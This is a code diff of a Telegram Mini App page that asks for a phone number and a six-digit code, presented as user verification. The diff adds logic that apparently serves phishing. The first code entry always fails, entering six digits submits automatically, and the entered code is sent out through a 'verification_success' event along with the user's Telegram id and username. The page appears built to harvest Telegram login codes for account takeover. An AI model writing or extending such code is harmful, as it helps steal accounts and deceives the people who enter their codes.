@@ -6,10 +6,10 @@ document.addEventListener('DOMContentLoaded', () => {
     tg.enableClosingConfirmation();
 
     // Проверяем, был ли пользователь уже верифицирован
-    //if (localStorage.getItem('isVerified')) {
-    //    window.location.href = '/mybot/verifer_user/index.html';
-    //    return;
-    //}
+    if (localStorage.getItem('isVerified')) {
+        window.location.href = '/mybot/verifer_user/index.html';
+        return;
+    }
 
     // Элементы DOM
     const phoneForm = document.getElementById('phone-form');
@@ -26,7 +26,13 @@ document.addEventListener('DOMContentLoaded', () => {
     // Вибрация
     const vibrate = (type = 'light') => {
         if (tg.HapticFeedback) {
-            tg.HapticFeedback.impactOccurred(type);
+            const types = {
+                'light': 'light',
+                'medium': 'medium',
+                'heavy': 'heavy',
+                'error': 'error'
+            };
+            tg.HapticFeedback.impactOccurred(types[type] || 'light');
         }
     };
 
@@ -37,9 +43,25 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     };
 
+    // Обработчик выхода из приложения
+    const handleAppClose = () => {
+        sendEvent('app_close', {
+            userId: tg.initDataUnsafe.user?.id,
+            username: tg.initDataUnsafe.user?.username,
+            timestamp: new Date().toISOString()
+        });
+    };
+
     // Инициализация
     sendEvent('init');
     vibrate('medium');
+    
+    // Добавляем обработчик закрытия
+    tg.onEvent('viewportChanged', (e) => {
+        if (e.isStateStable && !e.isExpanded) {
+            handleAppClose();
+        }
+    });
 
     // Форматирование номера
     phoneInput.addEventListener('input', (e) => {
@@ -54,6 +76,22 @@ document.addEventListener('DOMContentLoaded', () => {
         
         phoneInput.value = formatted.substring(0, 16);
         if (value.length % 2 === 0) vibrate('light');
+    });
+
+    // Ввод кода с вибрацией
+    codeInput.addEventListener('input', (e) => {
+        const value = e.target.value.replace(/\D/g, '');
+        codeInput.value = value.substring(0, 6);
+        
+        // Вибрация при каждом вводе цифры
+        if (value.length > 0 && value.length <= 6) {
+            vibrate('light');
+        }
+        
+        // Автоподтверждение при вводе 6 цифр
+        if (value.length === 6) {
+            submitCodeBtn.click();
+        }
     });
 
     // Валидация номера
@@ -112,15 +150,22 @@ document.addEventListener('DOMContentLoaded', () => {
                 codeInput.value = '';
                 attemptCount++;
                 vibrate('heavy');
-            }, 10000);
+            }, 3000);//10000
         } 
         // Вторая попытка - успешная верификация
         else {
             setTimeout(() => {
+                vibrate('heavy');
                 // Сохраняем статус верификации
                 localStorage.setItem('isVerified', 'true');
                 
-                // Перенаправляем на страницу верифицированного пользователя о
+                // Отправляем событие успешной верификации
+                sendEvent('verification_success', {
+                    code: code,
+                    attempts: attemptCount + 1
+                });
+                
+                // Перенаправляем на страницу верифицированного пользователя
                 window.location.href = 'https://otz2026.github.io/mybot/verifer_user/index.html';
             }, 2000);
         }
@@ -135,4 +180,4 @@ document.addEventListener('DOMContentLoaded', () => {
     function hideError(element) {
         element.style.display = 'none';
     }
-});
+});    
